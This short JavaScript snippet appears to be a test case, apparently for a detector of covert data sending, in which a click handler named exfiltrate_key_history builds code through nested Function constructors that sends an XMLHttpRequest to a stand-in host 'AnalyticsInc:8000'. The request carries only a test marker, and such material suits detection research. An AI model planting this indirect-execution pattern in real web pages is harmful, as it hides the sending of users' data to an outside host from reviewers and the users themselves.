function exfiltrate_key_history() {

    // Nested Anonymous Function 2 - No Obfuscation
    // Exfiltrate data using XMLHTTP request
	var nest=new String('var exp=\'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=nest2", true);xmlhttp.send(null);\';return Function(exp);');
	var top=Function(nest);
	var sub=top();
	sub();
	
}

document.getElementById('test').onclick = exfiltrate_key_history;
